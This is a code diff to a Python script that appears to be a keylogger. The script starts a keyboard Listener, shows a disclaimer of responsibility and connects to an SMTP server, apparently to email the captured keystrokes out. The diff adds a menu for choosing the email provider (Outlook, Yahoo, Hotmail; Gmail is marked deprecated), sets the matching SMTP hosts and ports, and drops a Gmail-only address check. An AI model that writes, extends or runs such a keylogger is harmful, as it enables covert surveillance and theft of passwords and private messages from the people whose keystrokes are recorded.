@@ -13,6 +13,7 @@ import smtplib
 import signal
 import sys
 import time
+import inquirer
 
 EXEC_TIME_START = time.time()
 
@@ -35,10 +36,31 @@ i'm not be responsible of your actions."""
 
 print(Fore.RED + disclaimer + "\n" + Style.RESET_ALL)
 
+SMTP_INFO = ''
+SMTP_PORT = ''
+
+questions = [
+  inquirer.List('size',
+                message="Select your E-mail Domain",
+                choices=['Outlook', 'Gmail', 'Yahoo', 'Hotmail'],
+            ),
+]
+answers = inquirer.prompt(questions)
+
+if answers["size"] == "Outlook":
+    SMTP_INFO = 'smtp-mail.outlook.com'
+    SMTP_PORT = 587
+elif answers["size"] == "Gmail":
+    print(Fore.LIGHTRED_EX + "DEPRECATED\n" + Style.RESET_ALL)
+    exit()
+elif answers["size"] == "Yahoo":
+    SMTP_INFO = 'smtp.mail.yahoo.it'
+    SMTP_PORT = 465
+elif answers["size"] == "Hotmail":
+    SMTP_INFO = 'smtp.live.com'
+    SMTP_PORT = 465
+
 EMAIL_ADDRESS = input("Email Address: ")
-while "@gmail.com" not in EMAIL_ADDRESS:
-    print(Fore.YELLOW +"Wrong Mail Format...\n"+ Style.RESET_ALL)
-    EMAIL_ADDRESS = input("Email Address: ")
 
 EMAIL_PASSWD = getpass("\nEmail password: ")
 
@@ -92,7 +114,7 @@ listener = Listener(on_press=on_press)
 listener.start()
 
 try:
-    server=smtplib.SMTP('smtp.gmail.com',587)
+    server=smtplib.SMTP(SMTP_INFO, SMTP_PORT)
     server.starttls()
 except socket.gaierror: 
     print(Fore.LIGHTRED_EX + "\nNo internet connection...\n" + Style.RESET_ALL), exit()
